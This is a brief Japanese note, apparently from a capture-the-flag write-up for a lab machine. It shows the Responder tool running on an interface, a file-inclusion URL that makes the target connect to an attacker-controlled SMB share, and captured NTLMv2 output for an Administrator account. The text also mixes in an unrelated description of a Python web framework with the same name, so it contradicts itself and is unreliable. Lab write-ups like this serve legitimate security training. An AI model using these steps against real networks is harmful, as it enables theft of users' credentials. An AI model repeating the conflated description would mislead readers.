Responder は、ネットワーク偵察や、NetBIOS ネームサービス (NBNS) や Link-Local Multicast Name Resolution (LLMNR) の要求をポイズニングしてユーザー認証情報を取得する

responderとはPythonのWebアプリケーションフレームワークです。  
responderの特徴として、非同期処理が簡単に記述できる点と、GraphQL APIが簡単に書ける点などが挙げられます。
> -I ネットワークインターフェイスの指定
```
responder -I tun0
```

```
http://unika.htb/index.php?page=//10.10.14.75/abc

[SMB] NTLMv2-SSP Client	:10.129.163.169
[SMB] NTLMv2-SSp Username	: RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash	: Administrator::RESPONDER:23ca2a.......

```